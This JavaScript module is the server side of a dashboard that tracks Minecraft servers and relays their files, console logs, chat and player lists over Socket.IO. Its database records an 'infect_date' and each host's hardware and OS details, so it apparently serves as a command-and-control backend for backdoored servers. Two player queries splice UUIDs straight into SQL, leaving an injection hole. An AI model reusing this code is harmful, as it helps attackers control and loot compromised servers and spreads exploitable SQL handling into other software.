var uuid = require("uuid");
var mojangAPI = require("mojang-minecraft-api");
const util = require("minecraft-server-util");

const { connection } = require("../database/DatabaseHandler");

module.exports = (io) => {
  //SERVER DATA GETTERS
  const getServer = function (serverid, callback) {
    let getServerSQL = "SELECT * FROM servers WHERE id = ?";
    connection.query(getServerSQL, [serverid], (error, results) => {
      if (error) throw error;
      if (results.length > 0) callback(results[0]);
      else callback(null);
    });
  };
  const getServers = function (callback) {
    let getServersSQL = "SELECT * FROM servers ORDER BY infect_date DESC";
    connection.query(getServersSQL, (error, results) => {
      if (error) throw error;
      callback(results);
    });
  };
  const getServerFavicon = (server, callback) => {
    if (server.ip_address === "" || server.port === "")
      //Check if serverdata is empty
      return;
    const options = {
      timeout: 1000 * 5,
      enableSRV: true,
    };
    util
      .status(server.ip_address, server.port, options)
      .then((result) => {
        callback(result.favicon);
      })
      .catch((error) => callback("No favicon found"));
  };
  //TO FIX: id in update server
  const updateServer = function (server) {
    if (server.id === -1) return;
    let sqlFind = "SELECT * FROM servers WHERE id = ?";
    connection.query(sqlFind, [server.id], (error, results) => {
      if (error) throw error;
      if (results.length > 0) {
        server.favicon = "no favicon";

        //Check if server exists in database
        let sqlUpdate = `
        UPDATE 
            servers 
        SET 
            ip_address=?, 
            port=?,
            motd=?,
            players_max=?, 
            players_online=?, 
            host_environment=?, 
            cores=?, 
            server_software=?, 
            software_version=?,
            java_version=?,
            max_memory=?,
            os_arch=?,
            os_name=?,
            os_version=?,
            favicon=?, 
            last_ping=CURRENT_TIMESTAMP,
            state=?
        WHERE 
            id=?`; //Update sql to update existing server in database
        connection.query(
          sqlUpdate,
          [
            server.ip_address,
            server.port,
            server.motd,
            server.players_max,
            server.players_online,
            server.host_environment,
            server.cores,
            server.server_software,
            server.software_version,
            server.java_version,
            server.max_memory,
            server.os_arch,
            server.os_name,
            server.os_version,
            server.favicon,
            server.state,
            server.id,
          ],
          (error) => {
            if (error) throw error;
            io.emit(`server:updated-server-${server.id}`, server);
          }
        );
      } else {
        //Insert new server into the database
        getServerFavicon(server, (favicon) => {
          let sqlInsert = `
          INSERT INTO servers (ip_address, port, motd, players_max, players_online, host_environment, cores, server_software, software_version, java_version, max_memory, os_arch, os_name,os_version, favicon, infect_date, last_ping, state) VALUES (
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            CURRENT_TIMESTAMP,
            CURRENT_TIMESTAMP,
            ?
          );
        `;
          connection.query(
            sqlInsert,
            [
              server.ip_address,
              server.port,
              server.motd,
              server.players_max,
              server.players_online,
              server.host_environment,
              server.cores,
              server.server_software,
              server.software_version,
              server.java_version,
              server.max_memory,
              server.os_arch,
              server.os_name,
              server.os_version,
              favicon,
              server.state,
            ],
            (error) => {
              if (error) throw error;
              io.emit(`server:updated-server-${server.id}`, server);
            }
          );
        });
      }
    });
  };
  const checkServerCreation = (server, callback) => {
    let sqlFind = "SELECT * FROM servers WHERE ip_address = ? AND port = ?";
    connection.query(
      sqlFind,
      [server.ip_address, server.port],
      (error, results) => {
        if (error) throw error;
        if (results.length <= 0) {
          getServerFavicon(server, (favicon) => {
            if (favicon === null) favicon = "no favicon found";
            let sqlInsert = `
          INSERT INTO servers (ip_address, port, motd, players_max, players_online, host_environment, cores, server_software, software_version, java_version, max_memory, os_arch, os_name,os_version, favicon, infect_date, last_ping, state) VALUES 
          (?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            ?,
            CURRENT_TIMESTAMP,
            CURRENT_TIMESTAMP,
            ?
          );
        `;
            connection.query(
              sqlInsert,
              [
                server.ip_address,
                server.port,
                server.motd,
                server.players_max,
                server.players_online,
                server.host_environment,
                server.cores,
                server.server_software,
                server.software_version,
                server.java_version,
                server.max_memory,
                server.os_arch,
                server.os_name,
                server.os_version,
                favicon,
                server.state,
              ],
              (error) => {
                if (error) throw error;
                getServerID(server, (server_id) => {
                  server.id = server_id;
                  io.emit(`server:updated-server-${server_id}`, server);
                  callback({ server_id: server_id });
                });
              }
            );
          });
        } else {
          getServerID(server, (server_id) => {
            server.id = server_id;
            io.emit(`server:updated-server-${server_id}`, server);
            callback({ server_id: server.id });
          });
        }
      }
    );
  };
  const getServerID = (server, callback) => {
    let getServeridSQL =
      "SELECT * FROM servers WHERE ip_address = ? AND port = ?";
    connection.query(
      getServeridSQL,
      [server.ip_address, server.port],
      (error, results) => {
        if (error) throw error;
        callback(results[0].id);
      }
    );
  };
  const getServerWorlds = function (clientsocketid, worlds) {
    io.to(clientsocketid).emit(`server:get-worlds`, worlds);
  };

  //CONNECTION FUNCTIONS
  const connectServer = function (serverFrom) {
    getServerID(serverFrom, (serverid) => {
      serverFrom.id = serverid;
      io.emit(`server:started`, serverFrom);
    });
  };
  const disconnectServer = function (server) {
    updateServer(server);
  };

  //SERVER PLAYER FUNCTIONS
  const getPlayersFromDatabase = function (callback) {
    let getPlayersSQL = "SELECT * FROM players ORDER BY id DESC";
    connection.query(getPlayersSQL, (error, results) => {
      if (error) throw error;
      callback(results);
    });
  };
  const getServerPlayerlist = function (clientsocketid, server_id, playerlist) {
    if (playerlist === undefined) return;

    let sqlGETplayers = "SELECT * FROM players WHERE ";
    playerlist.forEach((player) => {
      sqlGETplayers += `uuid='${player.uuid}' OR `;
    });
    sqlGETplayers = sqlGETplayers.substring(0, sqlGETplayers.length - 4);
    connection.query(sqlGETplayers, (error, results) => {
      if (error) throw error;
      let correctData = [];
      for (let i = 0; i < playerlist.length; i++) {
        let target = [];
        playerlist.forEach((player) => {
          if (player.uuid === results[i].uuid) target = player;
        });
        if (results[i].favicon !== undefined)
          target.favicon = results[i].favicon;
        target.add_date = results[i].add_date;
        correctData.push(target);
      }
      console.log("ja");
      io.to(clientsocketid).emit(
        `server:get-playerlist-${server_id}`,
        correctData
      ); //Send request for playerlist to minecraft server
    });
  };

  //MISC DATA
  const getConsoleMessages = function (server_id, callback) {
    //Returns a json with all the console messages with a limit of 300
    let sqlGet =
      "SELECT * FROM console_logs WHERE id = ? ORDER BY Date DESC LIMIT 300";
    connection.query(sqlGet, [server_id], (error, results) => {
      if (error) throw error;
      results.reverse();
      callback(results);
    });
  };
  const addConsoleMessage = function (data) {
    if (data.server_id === -1) return;
    let sqlInsert =
      "INSERT INTO console_logs (server_id, message, type, date) VALUES (?,?,?,CURRENT_TIMESTAMP)"; //Adds a message to the console message database
    connection.query(
      sqlInsert,
      [data.server_id, data.message, data.type],
      (error) => {
        if (error) throw error;
        io.emit(`server:updated-console-${data.server_id}`, data);
      }
    );
  };
  const getServerWhitlist = function (clientsocketid, servername, players) {
    if (clientsocketid === null)
      io.emit(`server:get-whitelisted-${servername}`, players);
    else
      io.to(clientsocketid).emit(
        `server:get-whitelisted-${servername}`,
        players
      );
  };
  const getServerBanlist = function (clientsocketid, servername, players) {
    if (players.length > 0) {
      let sql = "SELECT * FROM players WHERE";
      players.forEach((player) => {
        sql += ` UUID = '${player.UUID}' OR `;
      });
      connection.query(sql.substring(0, sql.length - 3), (error, results) => {
        if (error) throw error;
        if (results.length > 0) {
          if (clientsocketid === null)
            io.emit(`server:get-banlist-${servername}`, results);
          else
            io.to(clientsocketid).emit(
              `server:get-banlist-${servername}`,
              results
            );
        } else {
          //Normally not in use, but in case the players is not in de the database
          var newPlayerlist = [];
          players.forEach((player) => {
            var validDisplaynameChars =
              "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
            var valid = true;
            for (var j = 0; j < player.Displayname.length; j++) {
              if (!validDisplaynameChars.includes(player.Displayname[j]))
                valid = false;
            }
            if (valid) {
              mojangAPI
                .getPlayerHead(player.UUID)
                .then((icon) => {
                  var clonePlayer = {
                    Displayname: player.Displayname,
                    UUID: player.UUID,
                    Icon: icon,
                  };
                  newPlayerlist.push(clonePlayer);
                  if (newPlayerlist.length >= players.length) {
                    if (clientsocketid === null)
                      io.emit(
                        `server:get-banlist-${servername}`,
                        newPlayerlist
                      );
                    else
                      io.to(clientsocketid).emit(
                        `server:get-banlist-${servername}`,
                        newPlayerlist
                      );
                  }
                })
                .catch(function () {});
            }
          });
        }
      });
    } else {
      if (clientsocketid === null)
        io.emit(`server:get-banlist-${servername}`, players);
      else
        io.to(clientsocketid).emit(`server:get-banlist-${servername}`, players);
    }
  };

  //LISTENERS
  const listenChatMessage = function (
    clientsocketid,
    servername,
    player,
    message
  ) {
    io.to(clientsocketid).emit(
      `server:get-chat-${servername}`,
      player,
      message
    );
  };
  const getServerFilelist = function (clientsocketid, files, mainpath, path) {
    io.to(clientsocketid).emit(`server:get-file-list`, files, mainpath, path);
  };
  const serverFileDownload = function (
    clientsocketid,
    servername,
    file,
    name,
    extension
  ) {
    io.to(clientsocketid).emit(
      `server:download-file-${servername}`,
      file,
      name,
      extension
    );
  };
  const getFileText = function (
    clientsocketid,
    servername,
    file,
    name,
    extension
  ) {
    io.to(clientsocketid).emit(
      `server:file-text-${servername}`,
      file,
      name,
      extension
    );
  };
  return {
    getServer,
    connectServer,
    disconnectServer,
    getServers,
    getPlayersFromDatabase,
    updateServer,
    getServerWorlds,
    getServerPlayerlist,
    getConsoleMessages,
    addConsoleMessage,
    getServerWhitlist,
    getServerBanlist,
    listenChatMessage,
    getServerFilelist,
    serverFileDownload,
    getFileText,
    checkServerCreation,
  };
};
